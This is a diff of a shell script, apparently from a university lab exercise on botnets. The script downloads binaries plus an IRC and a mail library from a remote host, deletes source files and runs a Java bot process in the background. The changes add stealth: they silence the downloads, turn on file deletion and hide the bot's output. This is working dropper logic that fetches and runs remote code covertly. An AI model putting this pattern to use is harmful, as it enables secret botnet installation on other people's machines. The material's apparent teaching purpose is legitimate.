@@ -24,18 +24,18 @@ if [ -z "$DIR" ]; then
     fi
     cd "${DIR}${FOLDER}"
 
-    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2"
-    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3"
-    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN4"
-    wget "abstract.cs.washington.edu/~roy/lab3/$PIRC"
-    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN"
-    wget "abstract.cs.washington.edu/~roy/lab3/$MAIL"
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN2" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN3" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN4" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$PIRC" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN" &> /dev/null
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
     #javac $SRC                                                                                                          
 
-    #rm $SRC                                                                                                            
-    #rm $PIC 
-    #rm $MAIL                                                                                                                   
-    java -classpath "${PIRC}:${MAIL}:." $TARGET # &> /dev/null &                                                       
+    rm $SRC                                                                                                            
+    rm $PIC 
+    rm $MAIL                                                                                                                   
+    java -classpath "${PIRC}:${MAIL}:." $TARGET &> /dev/null &                                                       
     cd $CURDIR
 fi
 ###########################################
